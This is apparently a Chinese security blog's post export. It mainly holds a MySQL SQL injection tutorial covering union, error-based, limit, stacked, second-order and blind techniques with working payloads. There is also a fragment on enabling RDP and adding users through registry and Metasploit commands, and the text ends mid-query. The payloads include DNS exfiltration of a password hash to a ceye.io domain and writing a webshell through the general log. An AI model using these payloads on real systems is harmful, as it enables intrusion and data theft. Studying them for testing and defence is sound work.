&quot;HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal&quot; 2&gt;&amp;1Server\\WinStations\\RDP-Tcp&quot; &#x2F;v PortNumber &#x2F;t REG_DWORD &#x2F;d 0x00000d3d &#x2F;f&quot; 2&gt;&amp;1 检查3389是否开放 123456REG QUERY &quot;HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server&quot; &#x2F;v fDenyTSConnectionsHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server1表示关闭0表示开放fDenyTSConnections REG_DWORD 0x1 查看远程桌面服务所在的端口 12REG QUERY &quot;HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp&quot; &#x2F;v PortNumberHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp MSF与3389123run post&#x2F;windows&#x2F;manage&#x2F;enable_rdp #开启远程桌面run post&#x2F;windows&#x2F;manage&#x2F;enable_rdp USERNAME&#x3D;www2 PASSWORD&#x3D;123456 #添加用户run post&#x2F;windows&#x2F;manage&#x2F;enable_rdp FORWARD&#x3D;true LPORT&#x3D;6662 #将3389端口转发到6662 12portfwd add -l 6666 -p 3389 -r 127.0.0.1 #将目标机的3389端口转发到本地6666端口run getgui -f 6661 –e","categories":[{"name":"内网安全","slug":"内网安全","permalink":"http://s1eady.top/categories/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"内网","slug":"内网","permalink":"http://s1eady.top/tags/%E5%86%85%E7%BD%91/"}]},{"title":"SQL--SQL注入漏洞","slug":"SQL注入漏洞","date":"2020-08-22T14:46:26.000Z","updated":"2020-10-06T09:55:32.783Z","comments":true,"path":"2020/08/22/SQL注入漏洞/","link":"","permalink":"http://s1eady.top/2020/08/22/SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/","excerpt":"","text":"漏洞原理用户将恶意的sql语句输入到参数中，恶意语句拼接到后台sql语句，执行sql语句到时候使得攻击者获取到对应的敏感数据，比如当前数据库用户、数据库中的表等信息，也可以读取敏感文件、写入服务器shell，进而获取主机权限。 基础知识MySQL 5.0以上版本。 数据库 information_schema 系统数据库，记录当前数据库的数据库，表，列，用户权限等信息。 表 SCHEMATA 储存mysql所有数据库的基本信息，包括数据库名，编码类型路径等。 TABLES 提供了关于数据库中的表的信息（包括视图）。详细表述了某个表属于哪个schema，表类型，表引擎，创建时间等信息。 COLUMNS 储存mysql中表的列信息，包括这个表的所有列以及每个列的信息，该列是表中的第几列，列的数据类型，列的编码类型，列的权限，列的注释等 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566mysql&gt; use information_schema;Reading table information for completion of table and column namesYou can turn off this feature to get a quicker startup with -ADatabase changedmysql&gt; show tables;+---------------------------------------+| Tables_in_information_schema |+---------------------------------------+| TABLES || SCHEMATA || COLLATION_CHARACTER_SET_APPLICABILITY || COLUMNS |mysql&gt; desc TABLES;+-----------------+---------------------+------+-----+---------+-------+| Field | Type | Null | Key | Default | Extra |+-----------------+---------------------+------+-----+---------+-------+| TABLE_CATALOG | varchar(512) | NO | | | || TABLE_SCHEMA | varchar(64) | NO | | | || TABLE_NAME | varchar(64) | NO | | | || TABLE_TYPE | varchar(64) | NO | | | || ENGINE | varchar(64) | YES | | NULL | || VERSION | bigint(21) unsigned | YES | | NULL | || ROW_FORMAT | varchar(10) | YES | | NULL | || TABLE_ROWS | bigint(21) unsigned | YES | | NULL | || AVG_ROW_LENGTH | bigint(21) unsigned | YES | | NULL | || DATA_LENGTH | bigint(21) unsigned | YES | | NULL | || MAX_DATA_LENGTH | bigint(21) unsigned | YES | | NULL | || INDEX_LENGTH | bigint(21) unsigned | YES | | NULL | || DATA_FREE | bigint(21) unsigned | YES | | NULL | || AUTO_INCREMENT | bigint(21) unsigned | YES | | NULL | || CREATE_TIME | datetime | YES | | NULL | || UPDATE_TIME | datetime | YES | | NULL | || CHECK_TIME | datetime | YES | | NULL | || TABLE_COLLATION | varchar(32) | YES | | NULL | || CHECKSUM | bigint(21) unsigned | YES | | NULL | || CREATE_OPTIONS | varchar(255) | YES | | NULL | || TABLE_COMMENT | varchar(2048) | NO | | | |+-----------------+---------------------+------+-----+---------+-------+mysql&gt; desc COLUMNS;+--------------------------+---------------------+------+-----+---------+-------+| Field | Type | Null | Key | Default | Extra |+--------------------------+---------------------+------+-----+---------+-------+| TABLE_CATALOG | varchar(512) | NO | | | || TABLE_SCHEMA | varchar(64) | NO | | | || TABLE_NAME | varchar(64) | NO | | | || COLUMN_NAME | varchar(64) | NO | | | || ORDINAL_POSITION | bigint(21) unsigned | NO | | 0 | || COLUMN_DEFAULT | longtext | YES | | NULL | || IS_NULLABLE | varchar(3) | NO | | | || DATA_TYPE | varchar(64) | NO | | | || CHARACTER_MAXIMUM_LENGTH | bigint(21) unsigned | YES | | NULL | || CHARACTER_OCTET_LENGTH | bigint(21) unsigned | YES | | NULL | || NUMERIC_PRECISION | bigint(21) unsigned | YES | | NULL | || NUMERIC_SCALE | bigint(21) unsigned | YES | | NULL | || DATETIME_PRECISION | bigint(21) unsigned | YES | | NULL | || CHARACTER_SET_NAME | varchar(32) | YES | | NULL | || COLLATION_NAME | varchar(32) | YES | | NULL | || COLUMN_TYPE | longtext | NO | | NULL | || COLUMN_KEY | varchar(3) | NO | | | || EXTRA | varchar(30) | NO | | | || PRIVILEGES | varchar(80) | NO | | | || COLUMN_COMMENT | varchar(1024) | NO | | | || GENERATION_EXPRESSION | longtext | NO | | NULL | |+--------------------------+---------------------+------+-----+---------+-------+21 rows in set (0.00 sec) 总结 MySQL服务器上，到底有哪些数据库、各个数据库有哪些表，每张表的字段类型是什么，各个数据库要什么权限才能访问，等等信息都保存在information_schema里面。 123456information_schema的表schemata中的列schema_name记录了所有数据库的名字information_schema的表tables中的列table_schema记录了所有数据库的名字information_schema的表tables中的列table_name记录了所有数据库的表的名字information_schema的表columns中的列table_schema记录了所有数据库的名字information_schema的表columns中的列table_name记录了所有数据库的表的名字information_schema的表columns中的列column_name记录了所有数据库的表的列的名字 常用函数right、left函数LEFT()函数是一个字符串函数,它返回具有指定长度的字符串的左边部分，我们在注入的时候，前台可能会限制回显字段，这时候我们可以使用这两个函数。 right同理 1234567891011121314151617181920212223mysql&gt; select right(&#x27;1234567890&#x27;,5);+-----------------------+| right(&#x27;1234567890&#x27;,5) |+-----------------------+| 67890 |+-----------------------+1 row in set (0.00 sec)mysql&gt; select right(&#x27;1234567890&#x27;,2);+-----------------------+| right(&#x27;1234567890&#x27;,2) |+-----------------------+| 90 |+-----------------------+1 row in set (0.00 sec)mysql&gt; select left(&#x27;1234567890&#x27;,5);+----------------------+| left(&#x27;1234567890&#x27;,5) |+----------------------+| 12345 |+----------------------+1 row in set (0.00 sec) isnull(exp)如果exp为null返回1，否侧返回0。 123456789101112131415mysql&gt; select isnull(1+1);+-------------+| isnull(1+1) |+-------------+| 0 |+-------------+1 row in set (0.00 sec)mysql&gt; select isnull(0);+-----------+| isnull(0) |+-----------+| 0 |+-----------+1 row in set (0.00 sec) 可以配合注入来判断文件是否存在以及是否有权限读取文件。 12mysql&gt; select * from math where id=1 and updatexml(0,concat(0x7e,isnull(LOAD_FILE(&#x27;/Users/apple/Desktop/2.txt&#x27;)),0x7e),0);ERROR 1105 (HY000): XPATH syntax error: &#x27;~1~&#x27; ifnull(expr1,expr2)假如expr1不为NULL，则IFNULL()的返回值为expr1; 否则其返回值为expr2。IFNULL()的返回值是数字或是字符串。 常用符号位运算符二进制数上进行计算的运算符。位运算会先将操作数变成二进制数，进行位运算。然后再将计算结果从二进制数变回十进制数。 按位或 1234567mysql&gt; select 0|9879;+--------+| 0|9879 |+--------+| 9879 |+--------+1 row in set (0.00 sec) 按位异或 1234567mysql&gt; select 0^9879;+--------+| 0^9879 |+--------+| 9879 |+--------+1 row in set (0.00 sec) 按位与 1234567mysql&gt; select 0&amp;5464;+--------+| 0&amp;5464 |+--------+| 0 |+--------+1 row in set (0.00 sec) 0与任何的数字A按位或、异或都是A数字。 0与任何数字按位与都是0。 逻辑运算符 逻辑运算符用来判断表达式的真假。如果表达式是真，结果返回 1。如果表达式是假，结果返回 0。 与运算符 123456789101112mysql&gt; select 2 and 0;+---------+| 2 and 0 |+---------+| 0 |+---------+ mysql&gt; select 2 and 1; +---------+ | 2 and 1 | +---------+ | 1 | +---------+ 或运算符 12345678910111213mysql&gt; select 2 or 0; +--------+ | 2 or 0 | +--------+ | 1 | +--------+ mysql&gt; select 2 or 1; +--------+ | 2 or 1 | +--------+ | 1 | +--------+ 非运算符 12345678910111213mysql&gt; select not 1; +-------+ | not 1 | +-------+ | 0 | +-------+ mysql&gt; select !0; +----+ | !0 | +----+ | 1 | +----+ 注入分类联合注入原理： 联合查询是可合并多个相似的选择查询的结果集。等同于将一个表追加到另一个表，从而实现将两个表的查询组合到一起，使用谓词为union或union all。 条件： 页面有回显、有占位符 占位符： 从数据库中取出某些输入能够显示到页面上的某一个位置。 步骤： 判断是否有注入 判断是数字型注入还是字符型注入 猜测查询列数 列数小,正常回显,num大,不回显。 寻找占位 获取所有数据库名 获取指定数据的所有表名 获取指定数据库的指定数据表的所有字段名 获取指定数据库的指定数据表的所有的内容 报错注入 BIGINT等数据类型溢出 原理： 在mysql5.5之前，整形溢出是不会报错的，只有版本号大于5.5.5时，才会报错。 在mysql中要想获取BIGINT最大值，可以直接0按位置取反,超出最大值就会报错，而sql语句在执行成功的时候会返回0，取反之后就会变成1。 12345678910111213141516171819202122mysql&gt; select ~0;+----------------------+| ~0 |+----------------------+| 18446744073709551615 |+----------------------+1 row in set (0.00 sec)mysql&gt; select (select * from (select user())x);+----------------------------------+| (select * from (select user())x) |+----------------------------------+| root@localhost |+----------------------------------+1 row in set (0.00 sec)mysql&gt; select !(select * from (select user())x);+-----------------------------------+| !(select * from (select user())x) |+-----------------------------------+| 1 |+-----------------------------------+1 row in set (0.00 sec) 超出最大值就会报错： 12mysql&gt; select ~0+1;ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in &#39;(~(0) + 1)&#39; SQL注入利用 组合好逐位取反和逻辑取反运算，我们就能利用溢出错误来成功的注入查询。 12mysql&gt; select ~0+!(select*from(select user())x);ERROR 1690 (22003): BIGINT value is out of range in &#39;(~(0) + (not((select &#39;root@localhost&#39; from dual))))&#39; 返回0 1select*from(select user())x 返回1 1!(select*from(select user())x); 溢出 1~0+!(select*from(select user())x); 同理 1!(select*from(select user())x)-~0 1mysql&gt; select username, password from users where id&#x3D;&#39;1&#39; or !(select*from(select user())x)-~0; 注意： 当MySQL版本大于或等于5.5.53时，数据溢出注入无效。 exp()函数：当传入的数值大于709的时候就会报错。 12345678910mysql&gt; select exp(709);+-----------------------+| exp(709) |+-----------------------+| 8.218407461554972e307 |+-----------------------+1 row in set (0.00 sec)mysql&gt; select exp(710);ERROR 1690 (22003): DOUBLE value is out of range in &#39;exp(710)&#39; exp函数与整形溢出结合 mysql&gt;5.5.53时，则不能返回查询结果 12345678910mysql&gt; select version();+-----------+| version() |+-----------+| 5.7.26 |+-----------+1 row in set (0.00 sec)mysql&gt; select exp(~(select * from (select user())x));ERROR 1690 (22003): DOUBLE value is out of range in &#39;exp(~((select &#96;x&#96;.&#96;user()&#96; from (select user() AS &#96;user()&#96;) &#96;x&#96;)))&#39; mysql5.5.47可以在报错中返回查询结果 12mysql&gt; select (select(!x-~0)from(select(select user())x)a);ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in &#39;((not(&#96;a&#96;.&#96;x&#96;)) - ~(0))&#39; xpath语法错误 原理： mysql&gt;5.1.5，提供两个函数来修改和查询XML，updatexml用来修改文档，extractvalue用来按照xpath语法查询节点内容。 updatexml()函数 1234UPDATEXML (XMLdocument, XPathstring, new_value);第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc第二个参数：XPath_string (Xpath格式的字符串)第三个参数：new_value，String格式，替换查找到的符合条件的数据 UPDATEXML第二个参数需要Xpath格式的字符串，如果不符合就会报错。 12mysql&gt; select updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1);ERROR 1105 (HY000): XPATH syntax error: &#39;~5.7.26~&#39; extractvalue()对XML文档进行查询的函数 123ExtractValue(xml_frag, xpath_expr)第一个参数：可以传入目标xml文档第二个参数：用Xpath路径法表示的查找路径 寻找前一段xml文档内容中的a节点下的b节点，这里如果Xpath格式语法书写错误的话，就会报错。 12mysql&gt; SELECT extractvalue(&#39;22&#39;,concat(&#39;~&#39;,(select version())));ERROR 1105 (HY000): XPATH syntax error: &#39;~5.7.26&#39; 主键重复 基本函数 rand() rand()随机产生一个0～1的数字 123456789101112131415mysql&gt; select rand();+----------------------+| rand() |+----------------------+| 0.006128073675677249 |+----------------------+1 row in set (0.01 sec)mysql&gt; select rand();+---------------------+| rand() |+---------------------+| 0.33123136435750067 |+---------------------+1 row in set (0.00 sec) rand(0)产生一个固定的0～1的数字 123456789101112131415mysql&gt; select rand(0);+---------------------+| rand(0) |+---------------------+| 0.15522042769493574 |+---------------------+1 row in set (0.00 sec)mysql&gt; select rand(0);+---------------------+| rand(0) |+---------------------+| 0.15522042769493574 |+---------------------+1 row in set (0.00 sec) 有几条数据就会返回几条随机数 123456789101112131415161718192021222324252627mysql&gt; select rand() from math;+----------------------+| rand() |+----------------------+| 0.6377726314941167 || 0.1951690951317261 || 0.06252761190992558 || 0.7271308048880946 || 0.44807121944434125 || 0.058963713291067366 || 0.9506049388559581 |+----------------------+7 rows in set (0.00 sec)mysql&gt; select * from math;+------+-----------+| id | name |+------+-----------+| 1 | gongxinao || 1 | 李明 || 1 | gongxinao || 1 | gongxinao || 25 | gongcheng || 3 | chengxian || 25 | gongcheng |+------+-----------+7 rows in set (0.00 sec) floor()该函数返回X的最大整数值，但不能大于X 1234567mysql&gt; select floor(5.23);+-------------+| floor(5.23) |+-------------+| 5 |+-------------+1 row in set (0.00 sec) floor() 返回小于等于该值的最大整数,rand返回0到1.乘2自然返回0到2,加上floor自然返回0到1.所以我们基本确认要么返回0要么返回1。 floor(rand(0)*2):具有确定性 floor(rand()*2):具有不确定性 原理： count()和group by在遇到rand()产生的重复值时报错。 Select name,count(*) from student group by name 这条语句的作用就是从student表中select出name和count(count会具体返回一个数字).这个数字的多少就是根据grop by 后面的name来决定。也就是说最终他会返回姓名以及每一个姓名出现的次数。 重点是这语句具体是怎么执行的？是如何计算出我们查询的不同字段(name)的个数的？ 发现mysql遇到该语句时会建立一个虚拟表。该虚拟表有两个字段，一个是分组的 key ，一个是计数值 count(*) 在查询数据的时候，首先查看该虚拟表中是否存在该分组，如果存在那么计数值加1，不存在则新建该分组 同理我们根据floor(rand(0)*2)进行分组—–这里要注意floor(rand(0)*2)执行之后是有规律的返回0或者1。 根据之前rand的顺序—011011011,我们来梳理一下为什么会报错 第一次计算执行一次产生0,表中不存在任何数据,然后开始插入 插入的时候会进行第二次计算,所以在执行一次产生1插入 第三次计算产生1因为第二次产生了1所以本次就无需在执行一次计算,直接在原来的基础上加1就可以,不会在进行一次计算 第四次产生0,原来的表中没有0所以要进行插入操作,会再一次计算产生1.所以会再次产生一个分组,注意是产生一个分组,不是单纯的产生一个数值 此时此刻就报错了。因为我们已经有了一个1分组了。注意是有了一个1分组了。在添加一个1分组会报错。 注意： sql语句在执行之后建立虚表分两种情况： 1、表中没有对应的列，执行一次查询，一次插入，floor(rand(0)*2)会被执行两次。 2、表中有对应的列，执行一次查询，一次插入，floor(rand(0)*2)只会被执行一次。 主键重复的最少前提就是虚拟表中要有三条数据才会产生重复,也就是group by执行至少三次,也就是对应的group by的表要有至少三条数据 几何函数 geometrycollection()，multipoint()，polygon()，multipolygon()，linestring()，multilinestring()等函数 这些函数报错原理大多都相同，都是不满足参数需求而导致的报错。 DNSlog外带配合报错注入 作为攻击者，提交注入语句，让数据库把需要查询的值和域名拼接起来，然后发生DNS查询，我们只要能获得DNS的日志，就得到了想要的值。所以我们需要有一个自己的域名，然后在域名商处配置一条NS记录，然后我们在NS服务器上面获取DNS日志即可。用ceye.io这个平台，这个平台就集成了Dnslog的功能。 12http:&#x2F;&#x2F;127.0.0.1&#x2F;mysql.php?id&#x3D;1 union select 1,2,load_file(CONCAT(&#39;\\\\&#39;,(SELECT hex(pass) FROM test.test_user WHERE name&#x3D;&#39;admin&#39; LIMIT 1),&#39;.mysql.steady.ceye.io\\abc&#39;)) load_file函数在Linux下是无法用来做dnslog攻击的。 其实我们平常在Widnows中用共享文件的时候就会用到这种网络地址的形式 \\sss.xxx\\test\\ 这也就解释了为什么CONCAT()函数拼接了4个\\了，因为转义的原因，4个就变\\成了2个\\，目的就是利用UNC路径。 tips： 因为Linux没有UNC路径这个东西，所以当MySQL处于Linux系统中的时候，是不能使用这种方式外带数据的 1UNC是一种命名惯例, 主要用于在Microsoft Windows上指定和映射网络驱动器. UNC命名惯例最多被应用于在局域网中访问文件服务器或者打印机。我们日常常用的网络共享文件就是这个方式。 Limit注入 常用函数 limit [位置偏移量,]行数 123456789101112131415161718mysql&gt; select * from math limit 1,2;+------+-----------+| id | name |+------+-----------+| 1 | 李明 || 1 | gongxinao |+------+-----------+2 rows in set (0.00 sec)mysql&gt; select * from math limit 1,3;+------+-----------+| id | name |+------+-----------+| 1 | 李明 || 1 | gongxinao || 1 | gongxinao |+------+-----------+3 rows in set (0.00 sec) benchmark benchmark函数有两个参数，第一个是执行次数，第二个是要测试的函数或者表达式 . limit注入 注入点 1select*from math limit 1,[可控点] 1select*from math order by id desc limit 1,2 limit后面能够拼接的函数只有into和procedure。 无order by关键字 使用union联合查询 1select id from math order by id desc limit 0,1 union select username from users; 报错注入(5.0.0&lt; MySQL &lt;5.6.6版本) 1select * from math order by id desc limit 0,1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1); 延时注入(5.0.0&lt; MySQL &lt;5.6.6版本) 1select * from math order by id desc limit 0,1 procedure analyse(if(substring(version(),1,1)&#x3D;5,benchmark(50000000,encode(&#39;msg&#39;,&#39;by 5 second&#39;)),0),1) 只能使用BENCHMARK，而不能使用sleep 有order by关键字 无法使用union关键字，可尝试盲注或者报错 报错注入(5.0.0&lt; MySQL &lt;5.6.6版本) 1select * from math order by id desc limit 0,1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1); 延时注入(5.0.0&lt; MySQL &lt;5.6.6版本) 1select * from math order by id desc limit 0,1 procedure analyse(if(substring(version(),1,1)&#x3D;5,benchmark(50000000,encode(&#39;msg&#39;,&#39;by 5 second&#39;)),0),1) 只能使用BENCHMARK，而不能使用sleep 堆叠注入定义 堆叠可以理解为多个sql语句放在一起，一起执行，在mysql命令行中我们的sql语句是以分号分割的，所以我们在sql注入的时候可以考虑，是否可以进行多语句执行注入。例如在mysql中 1234567891011121314151617181920mysql&gt; select * from math;select user();+------+-----------+| id | name |+------+-----------+| 1 | gongxinao || 1 | 李明 || 1 | gongxinao || 1 | gongxinao || 25 | gongcheng || 3 | chengxian || 25 | gongcheng |+------+-----------+7 rows in set (0.00 sec)+----------------+| user() |+----------------+| root@localhost |+----------------+1 row in set (0.00 sec) 而union 或者union all执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。 原理： mysql_query与mysqli-&gt;multi_query() mysql_query() 函数执行一条 MySQL 查询。 mysqli_multi_query()支持多查询，多查询使用多个分号进行分隔。 利用配合日志getshell 12id&#x3D;1;set global general_log&#x3D;&#39;on&#39;;set global general_log_file&#x3D;&#39;D:\\\\wwwroot\\\\web\\\\shell.php&#39;;#id&#x3D;1;select &#39;&lt;?php phpinfo();?&gt;&#39;;# 二次注入 原理： 用户第一次输入的数据，经过各种函数处理比如addslashes或者get_magic_quotes_gpc之后，仍然被原封不动的保存在数据库中，即存入了脏数据，当程序从数据库中取出脏数据的时候，进而产生了二次注入。 实例： sqlib-24 我们需要先去注册一个用户名为admin’ #的用户，用户名存入数据库，当我们需要修改当前用户的密码的时候，我们直接输入用户名，无须输入密码即可成功修改。 程序从数据库中取出脏数据后，执行的sql语句就是 1UPDATE users SET PASSWORD&#x3D;&#39;$pass&#39; where username&#x3D;&#39;admin&#39;#&#39; and password&#x3D;&#39;$curr_pass&#39; 盲注 原理： 指的是在不知道数据库返回值的情况下对数据中的内容进行猜测，实施SQL注入。盲注一般分为布尔盲注和基于时间的盲注。 盲注分为两类： 1.布尔盲注 布尔很明显Ture跟Fales，也就是说它只会根据你的注入信息返回Ture跟Fales，也就没有了之前的报错信息。 2.时间盲注 界面返回值只有一种,true 无论输入任何值 返回情况都会按正常的来处理。加入特定的时间函数，通过查看web页面返回的时间差来判断注入的语句是否正确。 常用函数 IF()1IF(expr1,expr2,expr3) 如果 expr1 是TRUE (expr1 &lt;&gt; 0 and expr1 &lt;&gt; NULL)，则 IF()的返回值为expr2; 否则返回值则为 expr3。IF() 的返回值为数字值或字符串值，具体情况视其所在语境而定。 MID()MID() 函数用于从文本字段中提取字符。 SELECT MID(column_name,start[,length]) FROM table_name; 12345678910111213141516171819202122232425mysql&gt; SELECT MID(&#39;NowaMagic&#39;,1,2);+----------------------+| MID(&#39;NowaMagic&#39;,1,2) |+----------------------+| No |+----------------------+1 row in set (0.00 sec)mysql&gt; SELECT MID(&#39;NowaMagic&#39;,1,3);+----------------------+| MID(&#39;NowaMagic&#39;,1,3) |+----------------------+| Now |+----------------------+1 row in set (0.00 sec)mysql&gt; SELECT MID(&#39;NowaMagic&#39;,0,3);+----------------------+| MID(&#39;NowaMagic&#39;,0,3) |+----------------------+| |+----------------------+1 row in set (0.00 sec)mysql&gt; substr() 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263mysql&gt; SELECT substr(&#39;NowaMagic&#39;,1,3);+-------------------------+| substr(&#39;NowaMagic&#39;,1,3) |+-------------------------+| Now |+-------------------------+1 row in set (0.01 sec)mysql&gt; SELECT substr(&#39;NowaMagic&#39;,1,1);+-------------------------+| substr(&#39;NowaMagic&#39;,1,1) |+-------------------------+| N |+-------------------------+1 row in set (0.01 sec)mysql&gt; SELECT substr(&#39;NowaMagic&#39;,2,1);+-------------------------+| substr(&#39;NowaMagic&#39;,2,1) |+-------------------------+| o |+-------------------------+1 row in set (0.00 sec)mysql&gt; SELECT substr(&#39;NowaMagic&#39;,3,1);+-------------------------+| substr(&#39;NowaMagic&#39;,3,1) |+-------------------------+| w |+-------------------------+1 row in set (0.00 sec)mysql&gt; SELECT substr(&#39;NowaMagic&#39;,1,3);+-------------------------+| substr(&#39;NowaMagic&#39;,1,3) |+-------------------------+| Now |+-------------------------+1 row in set (0.00 sec)mysql&gt; SELECT substr(&#39;NowaMagic&#39;,1,2);+-------------------------+| substr(&#39;NowaMagic&#39;,1,2) |+-------------------------+| No |+-------------------------+1 row in set (0.00 sec)mysql&gt; SELECT substr(&#39;NowaMagic&#39;,0,2);+-------------------------+| substr(&#39;NowaMagic&#39;,0,2) |+-------------------------+| |+-------------------------+1 row in set (0.00 sec)mysql&gt; SELECT substr(&#39;NowaMagic&#39;,0,1);+-------------------------+| substr(&#39;NowaMagic&#39;,0,1) |+-------------------------+| |+-------------------------+1 row in set (0.00 sec) case() 1234567891011121314151617181920212223mysql&gt; select case 2 when 1 then &#39;one&#39; when 2 then &#39;two&#39; else &#39;more&#39; end;+------------------------------------------------------------+| case 2 when 1 then &#39;one&#39; when 2 then &#39;two&#39; else &#39;more&#39; end |+------------------------------------------------------------+| two |+------------------------------------------------------------+1 row in set (0.00 sec)mysql&gt; select case 1 when 1 then &#39;one&#39; when 2 then &#39;two&#39; else &#39;more&#39; end;+------------------------------------------------------------+| case 1 when 1 then &#39;one&#39; when 2 then &#39;two&#39; else &#39;more&#39; end |+------------------------------------------------------------+| one |+------------------------------------------------------------+1 row in set (0.00 sec)mysql&gt; select case 3 when 1 then &#39;one&#39; when 2 then &#39;two&#39; else &#39;more&#39; end;+------------------------------------------------------------+| case 3 when 1 then &#39;one&#39; when 2 then &#39;two&#39; else &#39;more&#39; end |+------------------------------------------------------------+| more |+------------------------------------------------------------+1 row in set (0.00 sec) ord()ORD() 函数返回字符串第一个字符的 ASCII 值。 ELT(N,str1,str2,str3,…)如果N =1返回str1，如果N= 2返回str2，等等。返回NULL如果参数的数量小于1或大于N。ELT()是FIELD()的补集。 123456mysql&gt; SELECT ELT(1, &#39;ej&#39;, &#39;Heja&#39;, &#39;hej&#39;, &#39;foo&#39;);+---------------------------------------------------------+| ELT(1, &#39;ej&#39;, &#39;Heja&#39;, &#39;hej&#39;, &#39;foo&#39;) |+---------------------------------------------------------+| ej |+---------------------------------------------------------+ sleep()、BENCHMARK() 笛卡尔积 原理： 1AxB&#x3D;A和B中每个元素的组合所组成的集合，就是连接表 具体的方式就是将简单的表查询不断的叠加，使之以指数倍运算量的速度增长，不断增加系统执行 sql 语句的负荷，直到产生攻击者想要的时间延迟，利用系统自带的表和字段来完成攻击。 1SELECT count(*) FROM information_schema.columns A,information_schema.columns B,information_schema.columns C; 根据数据库查询的特点，这句话的意思就是将 A B C 三个表进行笛卡尔积（全排列），并输出 最终的行数。 实例： 配合if 1select * from table where id &#x3D; 1 and (if(substr(database(),1,1)&#x3D;&#39; &#39;, select count(*) from information_schema.columns A, information_schema.columns B,information_schema.columns C, null)) Get_lock() 加锁机制 在单数据库的环境下，如果想防止多个线程操作同一个表（多个线程可能分布在不同的机器上），可以使用这种方式，取表名为key，操作前进行加锁，操作结束之后进行释放，这样在多个线程的时候，即保证了单个表的串行操作，又保证了多个不同表的并行操作。 (1)GET_LOCK有两个参数，一个是key,表示要加锁的字段，另一个是加锁失败后的等待时间(s)，一个客户端对某个字段加锁以后另一个客户端再想对这个字段加锁就会失败，然后就会等待设定好的时间 (2)当调用 RELEASE_LOCK来释放上面加的锁或客户端断线了，上面的锁才会释放，其它的客户端才能进来。 原理： 尝试对一个字段加锁 1234567mysql&gt; select get_lock(&#39;username&#39;,10); +-------------------------+| get_lock(&#39;username&#39;,10) | +-------------------------+ | 1 | +-------------------------+1 row in set (0.01 sec) 尝试开启另一个客户端 1234567mysql&gt; select get_lock(&#39;username&#39;,10);+-------------------------+| get_lock(&#39;username&#39;,10) |+-------------------------+| 0 |+-------------------------+1 row in set (10.01 sec) 实例： 对有一个字段加锁 1select * from ctf where flag &#x3D; 1 and get_lock(&#39;username&#39;,1); 再次加锁(配合if) 1select * from ctf where flag &#x3D; 1 and 1 and if(substr(database(),1,1),get_lock(&#39;username&#39;,5),null); 限制条件： 限制条件就是数据库的连接必须是持久连接，我们知道 mysql_connect() 连接数据库后开始查询，然后调用 mysql_close() 关闭与数据库的连接，也就是 web 服务器与数据库服务器连接的生命周期就是整个脚本运行的生命周期，脚本结束连接即断开，但是很明显这里我们要利用的是前一个连接对后一个连接的阻碍作用导致延时，所以这里的连接必须是持久的。在Apache+PHP搭建的环境中需要使用 mysql_pconnect函数来连接数据库。 其他盲注函数–mysql中用regexp是区分大小写的 lpad和rpad函数 lpad(sourceStr, length, newStr)，将字符串newStr填补到sourceStr左边，直到sourceStr长度达到length。 1234567mysql&gt; select lpad(1,5,2);+-------------+| lpad(1,5,2) |+-------------+| 22221 |+-------------+1 row in set (0.00 sec) 配合盲注 123456789101112131415mysql&gt; select length(lpad(1,(select length(database())),2));+-----------------------------------------------+| length(lpad(1,(select length(database())),2)) |+-----------------------------------------------+| 4 |+-----------------------------------------------+1 row in set (0.01 sec)mysql&gt; select lpad(1,(select length(database())),2);+---------------------------------------+| lpad(1,(select length(database())),2) |+---------------------------------------+| 2221 |+---------------------------------------+1 row in set (0.00 sec) like和regexp: Like: % : 匹配0个或任意多个字符 _ : 匹配任意一个字符 1234567mysql&gt; select database();+------------+| database() |+------------+| test |+------------+1 row in set (0.00 sec) 判断第一个字符是否是t 1234567mysql&gt; select database() like &#39;t%&#39;;+----------------------+| database() like &#39;t%&#39; |+----------------------+| 1 |+----------------------+1 row in set (0.01 sec) 判断前两个字符是不是te 1234567mysql&gt; select database() like &#39;te%&#39;;+-----------------------+| database() like &#39;te%&#39; |+-----------------------+| 1 |+-----------------------+1 row in set (0.00 sec) 判断是否包含es两个字符 1234567mysql&gt; select database() like &#39;%es%&#39;;+------------------------+| database() like &#39;%es%&#39; |+------------------------+| 1 |+------------------------+1 row in set (0.00 sec) 判断有几个字符 123456789101112131415mysql&gt; select database() like &#39;_____&#39;;+-------------------------+| database() like &#39;_____&#39; |+-------------------------+| 0 |+-------------------------+1 row in set (0.00 sec)mysql&gt; select database() like &#39;____&#39;;+------------------------+| database() like &#39;____&#39; |+------------------------+| 1 |+------------------------+1 row in set (0.00 sec) 判断第一个字符是否t 1234567mysql&gt; select database() like &#39;t___&#39;;+------------------------+| database() like &#39;t___&#39; |+------------------------+| 1 |+------------------------+1 row in set (0.00 sec) like配合盲注 123456789101112131415mysql&gt; select * from math where id &#x3D;1 and if((select database() like &#39;t___&#39;),1,0);+------+-----------+| id | name |+------+-----------+| 1 | gongxinao || 1 | 李明 || 1 | gongxinao || 1 | gongxinao || 1 | 444 || 1 | 444 |+------+-----------+6 rows in set (0.02 sec)mysql&gt; select * from math where id &#x3D;1 and if((select database() like &#39;s___&#39;),1,0);Empty set (0.00 sec) 注意点就是如果匹配成功就会返回1否则就是0。 REGEXP: 盲注值正则表达式攻击(^、&amp;) 1234567891011121314151617181920212223242526272829303132333435363738mysql&gt; select name from math where id&#x3D;3;+-----------+| name |+-----------+| chengxian |+-----------+1 row in set (0.01 sec)mysql&gt; select (select name from math where id&#x3D;3) regexp&#39;^c&#39;;+-----------------------------------------------+| (select name from math where id&#x3D;3) 